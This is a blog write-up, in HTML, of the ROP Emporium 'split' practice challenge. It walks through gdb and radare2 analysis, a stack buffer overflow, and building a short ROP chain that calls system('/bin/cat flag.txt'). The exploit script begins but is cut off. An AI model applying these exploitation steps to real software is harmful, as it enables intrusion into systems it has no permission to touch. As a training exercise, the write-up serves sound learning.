<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>Return-Oriented Programming - Split</title><meta name="robots" content="follow, index"/><meta name="description" content="Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain."/><meta property="og:url" content="https://thuri10.github.io/blog/ropemporium-split"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Solar Bits"/><meta property="og:description" content="Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain."/><meta property="og:title" content="Return-Oriented Programming - Split"/><meta property="og:image" content="https://thuri10.github.io/static/images/ropemporium/split.jpg"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/0xhexski"/><meta name="twitter:title" content="Return-Oriented Programming - Split"/><meta name="twitter:description" content="Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain."/><meta name="twitter:image" content="https://thuri10.github.io/static/images/ropemporium/split.jpg"/><link rel="canonical" href="https://thuri10.github.io/blog/ropemporium-split"/><meta property="article:published_time" content="2021-12-20T00:00:00.000Z"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://thuri10.github.io/blog/ropemporium-split"
  },
  "headline": "Return-Oriented Programming - Split",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://thuri10.github.io/static/images/ropemporium/split.jpg"
    }
  ],
  "datePublished": "2021-12-20T00:00:00.000Z",
  "dateModified": "2021-12-20T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Thuri"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Thuri10",
    "logo": {
      "@type": "ImageObject",
      "url": "https://thuri10.github.io/static/images/logo.png"
    }
  },
  "description": "Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain."
}</script><meta name="next-head-count" content="20"/><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png"/><link rel="manifest" href="/static/favicons/site.webmanifest"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg" color="#5bbad5"/><meta name="msapplication-TileColor" content="#000000"/><meta name="theme-color" content="#000000"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preload" href="/_next/static/css/5015c81d955992a5.css" as="style"/><link rel="stylesheet" href="/_next/static/css/5015c81d955992a5.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-d19814fcf787c488.js" defer=""></script><script src="/_next/static/chunks/framework-97d5d6e713538c3d.js" defer=""></script><script src="/_next/static/chunks/main-56cb050b8f4d5bdc.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8f1a2a9a54e1f44.js" defer=""></script><script src="/_next/static/chunks/15-d6e72821fda09dc2.js" defer=""></script><script src="/_next/static/chunks/623-c1c42e432517d218.js" defer=""></script><script src="/_next/static/chunks/418-25ea0c7be4f6e68e.js" defer=""></script><script src="/_next/static/chunks/984-ba1c1a2a6a247638.js" defer=""></script><script src="/_next/static/chunks/883-e5fd7b43ed0c57ff.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-2eb0af3233d10bc2.js" defer=""></script><script src="/_next/static/cqLjL-8sxyQAjvkhbOEoE/_buildManifest.js" defer=""></script><script src="/_next/static/cqLjL-8sxyQAjvkhbOEoE/_ssgManifest.js" defer=""></script></head><body class="bg-white text-black antialiased dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex h-screen flex-col justify-between"><header class="flex items-center justify-between py-10"><div><a aria-label="SolarBits" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="344.564 330.278 111.737 91.218" width="53.87" height="43.61"><defs><linearGradient id="logo_svg__b" gradientUnits="userSpaceOnUse" x1="420.97" y1="331.28" x2="420.97" y2="418.5"><stop style="stop-color:#06b6d4;stop-opacity:1" offset="0%"></stop><stop style="stop-color:#67e8f9;stop-opacity:1" offset="100%"></stop></linearGradient><linearGradient id="logo_svg__d" gradientUnits="userSpaceOnUse" x1="377.89" y1="331.28" x2="377.89" y2="418.5"><stop style="stop-color:#06b6d4;stop-opacity:1" offset="0%"></stop><stop style="stop-color:#67e8f9;stop-opacity:1" offset="100%"></stop></linearGradient><path d="M453.3 331.28v28.57l-64.66 58.65v-30.08l64.66-57.14Z" id="logo_svg__a"></path><path d="M410.23 331.28v28.57l-64.67 58.65v-30.08l64.67-57.14Z" id="logo_svg__c"></path></defs><use xlink:href="#logo_svg__a" fill="url(#logo_svg__b)"></use><use xlink:href="#logo_svg__c" fill="url(#logo_svg__d)"></use></svg></div><div class="hidden h-6 text-2xl font-semibold sm:block">SolarBits</div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/blog">Blog</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/tags">Tags</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/about">About</a></div><button aria-label="Toggle Dark Mode" type="button" class="ml-1 mr-1 h-8 w-8 rounded p-1 sm:ml-4"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path></svg></button><div class="sm:hidden"><button type="button" class="ml-1 mr-1 h-8 w-8 rounded py-1" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed top-0 left-0 z-10 h-full w-full transform bg-gray-200 opacity-95 duration-300 ease-in-out dark:bg-gray-800 translate-x-full"><div class="flex justify-end"><button type="button" class="mr-5 mt-11 h-8 w-8 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg></button></div><nav class="fixed mt-8 h-full"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags">Tags</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/about">About</a></div></nav></div></div></div></header><main class="mb-auto"><div class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="fixed right-8 bottom-8 hidden flex-col gap-3 md:flex"><button aria-label="Scroll To Top" type="button" style="opacity:0" class="rounded-full bg-gray-200 p-2 text-gray-500 transition-all hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600"><svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M3.293 9.707a1 1 0 010-1.414l6-6a1 1 0 011.414 0l6 6a1 1 0 01-1.414 1.414L11 5.414V17a1 1 0 11-2 0V5.414L4.707 9.707a1 1 0 01-1.414 0z" clip-rule="evenodd"></path></svg></button></div><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="relative pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><div><h1 class="text-3xl font-bold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">Return-Oriented Programming - Split</h1></div><dd class="flex items-center justify-center text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2021-12-20" class="flex items-center"><i class="inline-block twa  twa-calendar"></i><span class="ml-1.5">Monday, December 20, 2021</span></time><span class="mx-2">-</span><div class="flex items-center"><i class="inline-block twa  twa-hourglass-not-done"></i><span class="ml-1.5">8 mins read</span></div></dd></div></dl></div></header><div class="divide-y divide-gray-200 pb-8 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6 xl:divide-y-0" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-5 xl:border-b xl:border-gray-200 xl:pt-11 xl:dark:border-gray-700"></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:col-span-3 xl:row-span-2 xl:pb-0"><div class="prose max-w-none pt-10 pb-8 dark:prose-dark"><h2 id="introduction"><a href="#introduction" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Introduction</h2><p>Challenge Description</p><blockquote><p>The elements that allowed you to complete ret2win are still present, they&#x27;ve just been split apart. Find them and recombine them using a short ROP chain</p></blockquote><p>The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The target binary can be downloaded from the authors website <a target="_blank" rel="noopener noreferrer" href="https://ropemporium.com">ropemporium</a>.</p><p>First we check the binary protections enabled on the downloaded. Only <strong>NX</strong> (Not executable) is enabled on the device according to <code>checksec</code> binary utility as shown in the image below.</p><div class="relative"><pre><code class="code-highlight language-bash"><span class="code-line">vx@archie:split$ checksec --file<span class="token operator">=</span>split
</span><span class="code-line">    Arch:     amd64-64-little
</span><span class="code-line">    RELRO:    Partial RELRO
</span><span class="code-line">    Stack:    No canary found
</span><span class="code-line">    NX:       NX enabled
</span><span class="code-line">    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</span></code></pre></div><p>From analysis of binary we use gdb debugger in order to analyze the functions present in the binary in order to understand the logic. We disassemble <strong>pwnme</strong> function as in the image below.The function looks familiar as for the ret2win function.</p><div class="relative"><pre><code class="code-highlight language-nasm"><span class="code-line">(gdb) disas pwnme
</span><span class="code-line">Dump of assembler code for function pwnme:
</span><span class="code-line">   <span class="token number">0x00000000004006e8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">&gt;</span>:	push   <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x00000000004006e9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
</span><span class="code-line">   <span class="token number">0x00000000004006ec</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">&gt;</span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
</span><span class="code-line">   <span class="token number">0x00000000004006f0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
</span><span class="code-line">   <span class="token number">0x00000000004006f4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
</span><span class="code-line">   <span class="token number">0x00000000004006f9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x00000000004006fe</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
</span><span class="code-line">   <span class="token number">0x0000000000400701</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">25</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x400580</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000400706</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">30</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400810</span>
</span><span class="code-line">   <span class="token number">0x000000000040070b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">35</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000400710</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40083c</span>
</span><span class="code-line">   <span class="token number">0x0000000000400715</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">45</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x000000000040071a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x400570</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x000000000040071f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">55</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
</span><span class="code-line">   <span class="token number">0x0000000000400723</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">59</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x60</span>
</span><span class="code-line">   <span class="token number">0x0000000000400728</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
</span><span class="code-line">   <span class="token number">0x000000000040072b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x0000000000400730</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">72</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x400590</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000400735</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">77</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40083f</span>
</span><span class="code-line">   <span class="token number">0x000000000040073a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">82</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x000000000040073f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">&gt;</span>:	nop
</span><span class="code-line">   <span class="token number">0x0000000000400740</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">&gt;</span>:	leave
</span><span class="code-line">   <span class="token number">0x0000000000400741</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">89</span><span class="token operator">&gt;</span>:	ret
</span><span class="code-line">End of assembler dump.
</span><span class="code-line">(gdb)
</span></code></pre></div><p>From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. <strong>memset</strong> is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27209%27%20height=%27256%27/%3e"/></span><img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="" src="/static/images/ropemporium/stack.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>Next function is <strong>read</strong> function, which reads for user input from the standard input file descriptor and stores in the specified buffer. From disassembled code, we are reading <strong>0x60</strong> bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.</p><div class="relative"><pre><code class="code-highlight language-c"><span class="code-line"><span class="token class-name">ssize_t</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre></div><p>For this challenge we don`t have a ret2win function which we are to return to. From the disassembly of the binary we have an interesting function called <strong>usefulFunction</strong>. The usefulFunction, does listing of the files in the directory when called by the function.</p><div class="relative"><pre><code class="code-highlight language-nasm"><span class="code-line">(gdb) disas usefulFunction
</span><span class="code-line">Dump of assembler code for function usefulFunction:
</span><span class="code-line">   <span class="token number">0x0000000000400742</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">&gt;</span>:	push   <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x0000000000400743</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
</span><span class="code-line">   <span class="token number">0x0000000000400746</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40084a</span>
</span><span class="code-line">   <span class="token number">0x000000000040074b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x400560</span> <span class="token operator">&lt;</span>system@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000400750</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">14</span><span class="token operator">&gt;</span>:	nop
</span><span class="code-line">   <span class="token number">0x0000000000400751</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x0000000000400752</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">&gt;</span>:	ret
</span><span class="code-line">End of assembler dump.
</span><span class="code-line">(gdb) x<span class="token operator">/</span>s <span class="token number">0x40084a</span>
</span><span class="code-line"><span class="token number">0x40084a</span>:	<span class="token string">&quot;/bin/ls&quot;</span>
</span><span class="code-line">(gdb)
</span></code></pre></div><p>Goal is to pass a different string to the system function instead of <strong>&quot;/bin/ls&quot;</strong></p><p>From the authors hint, we can look for useful hints in the binary using either radare2 or rizin. Both tools perform the same function, it is a matter of choice.</p><blockquote><p>Now that you&#x27;ve gathered the elements of your exploit you can start to piece them together, you want to call system() with the <strong>&quot;/bin/cat flag.txt&quot;</strong> string as the only argument. You&#x27;ll also have to start dealing with the differences between the various architectures&#x27; calling conventions.</p></blockquote><p>Opening the binary in radare2, we can use <strong>iz</strong> command to look for strings. The goal is to read the flag from the system.</p><div class="relative"><pre><code class="code-highlight language-nasm"><span class="code-line"><span class="token operator">[</span><span class="token number">0x004005b0</span><span class="token operator">]</span><span class="token operator">&gt;</span> iz
</span><span class="code-line">nth paddr      vaddr      len size section type  string
</span><span class="code-line"><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
</span><span class="code-line"><span class="token number">0</span>   <span class="token number">0x000007e8</span> <span class="token number">0x004007e8</span> <span class="token number">21</span>  <span class="token number">22</span>   .rodata ascii split by ROP Emporium
</span><span class="code-line"><span class="token number">1</span>   <span class="token number">0x000007fe</span> <span class="token number">0x004007fe</span> <span class="token number">7</span>   <span class="token number">8</span>    .rodata ascii x86_64\n
</span><span class="code-line"><span class="token number">2</span>   <span class="token number">0x00000806</span> <span class="token number">0x00400806</span> <span class="token number">8</span>   <span class="token number">9</span>    .rodata ascii \nExiting
</span><span class="code-line"><span class="token number">3</span>   <span class="token number">0x00000810</span> <span class="token number">0x00400810</span> <span class="token number">43</span>  <span class="token number">44</span>   .rodata ascii Contriving a reason to ask user for data...
</span><span class="code-line"><span class="token number">4</span>   <span class="token number">0x0000083f</span> <span class="token number">0x0040083f</span> <span class="token number">10</span>  <span class="token number">11</span>   .rodata ascii Thank you<span class="token operator">!</span>
</span><span class="code-line"><span class="token number">5</span>   <span class="token number">0x0000084a</span> <span class="token number">0x0040084a</span> <span class="token number">7</span>   <span class="token number">8</span>    .rodata ascii <span class="token operator">/</span>bin<span class="token operator">/</span>ls
</span><span class="code-line"><span class="token number">0</span>   <span class="token number">0x00001060</span> <span class="token number">0x00601060</span> <span class="token number">17</span>  <span class="token number">18</span>   .data   ascii <span class="token operator">/</span>bin<span class="token operator">/</span>cat flag.txt
</span><span class="code-line">
</span></code></pre></div><p>We have an important string <strong>&quot;/bin/cat flag.txt&quot;</strong> which will enable us to complete our goal. Now we need pass the string to system function as follows <strong>system(&#x27;/bin/cat flag.txt&#x27;)</strong>.</p><p>For building ropchain, we need to understand the calling conventions of <strong>AMD64 ABI</strong>.The calling convention passes the arguments to the registers in the following order <strong>RDI, RSI, RDX, RCX, R8 and R9</strong>.</p><p>Because the system function receives one argument, we need to look for one gadgets that we control the <strong>rdi</strong> address.</p><p><strong>What are gadgets?</strong> Gadgets are sequence of instructions the end with ret instruction. Because we want to load a value into rdi register, we look for a pop <strong>pop rdi; ret</strong> instruction in order to pass an argument to the system function.</p><p>For searching gadget in radare2/rizin, use <strong>/R</strong> command as shown in the image below.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27726%27%20height=%2795%27/%3e"/></span><img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="" src="/static/images/ropemporium/split_poprdi.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27211%27%20height=%27366%27/%3e"/></span><img alt="ropchain" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="ropchain" src="/static/images/ropemporium/popgadget.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>The goal is to overwrite the return address with the address of <strong>&quot;pop rdi, ret &quot;</strong> and then call system function. we need to fill the buffer memory with 32bytes, 8 bytes more to overwrite the rbp address and 8 bytes teo overwrite the return address with pop rdi address.</p><h2 id="exploit"><a href="#exploit" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Exploit</h2><p>Full exploit of split challenge is;</p><div class="relative"><pre><code class="code-highlight language-python"><span class="code-line"><span class="token keyword">import</span> pwn
</span><span class="code-line">
</span><span class="code-line">pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">&quot;latin-1&quot;</span>
</span><span class="code-line">pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">&quot;ignore&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">&quot;amd64&quot;</span>
</span><span class="code-line">
</span><span class="code-line">io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">&quot;./split&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">
